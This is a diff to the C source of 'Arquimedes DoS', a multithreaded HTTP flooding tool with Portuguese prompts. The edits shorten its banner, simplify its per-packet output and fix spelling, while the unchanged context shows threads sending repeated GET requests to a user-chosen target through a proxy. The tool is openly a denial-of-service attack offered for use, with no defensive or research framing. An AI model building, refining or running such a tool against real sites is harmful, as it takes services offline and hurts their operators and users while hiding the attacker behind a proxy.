@@ -24,16 +24,9 @@ void banner() {
         "/  _  \\ | | (_| | |_| | | | | | | |  __/ (_| |  __/\\__ \\\n"
         "\\_/ \\_/_|  \\__, |\\__,_|_|_| |_| |_|\\___|\\__,_|\\___||___/\n"
         "             |_|                                        \n"
-        "    ___      __                                         \n"
-        "   /   \\___ / _\\                                        \n"
-        "  / /\\ / _ \\\\ \\                                         \n"
-        " / /_// (_) |\\ \\                                        \n"
-        "/___,' \\___/\\__/                                        \n"
-        "\n"
-        "🌀 Arquimedes Dos 🌀\n"
-        "🪓 By Jhon Lamdenberguer 🪓\n"
-        "📱 Team Família Flodder Techno 📱\n"
-        "============================\n"
+        "Arquimedes DoS - By Jhon Lamdenberguer\n"
+        "Team Família Flodder Techno\n"
+        "=======================================\n"
     );
 }
 
@@ -41,7 +34,6 @@ void *attack_thread(void *arg) {
     struct sockaddr_in proxy_addr;
     int sock;
     char request[1024];
-    int sent_packets = 0;
 
     proxy_addr.sin_family = AF_INET;
     proxy_addr.sin_port = htons(proxy_port);
@@ -66,12 +58,7 @@ void *attack_thread(void *arg) {
                  "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", host);
         send(sock, request, strlen(request), 0);
 
-        sent_packets++;
-        if (sent_packets == 1) {
-            printf("%s -> %d pacote enviado para %s porta %d\n", SCRIPT_NAME, sent_packets, host, port);
-        } else {
-            printf("%s -> %d pacotes enviados para %s porta %d\n", SCRIPT_NAME, sent_packets, host, port);
-        }
+        printf("%s -> pacote %d enviado para %s:%d\n", SCRIPT_NAME, i + 1, host, port);
 
         close(sock);
         usleep(100000);
@@ -88,16 +75,16 @@ int main() {
     scanf("%255s", host);
     printf("Porta do site -> ");
     scanf("%d", &port);
-    printf("Quantidade de packtes por thread -> ");
+    printf("Quantidade de pacotes por thread -> ");
     scanf("%d", &total_packets_per_thread);
-    printf("Ip da sua proxy -> ");
+    printf("IP da sua proxy -> ");
     scanf("%99s", proxy_ip);
     printf("Porta da sua proxy -> ");
     scanf("%d", &proxy_port);
     printf("Quantidade de threads -> ");
     scanf("%d", &threads_count);
 
-    printf("Ataque iníciado...\n");
+    printf("Ataque iniciado...\n");
 
     pthread_t threads[threads_count];
 
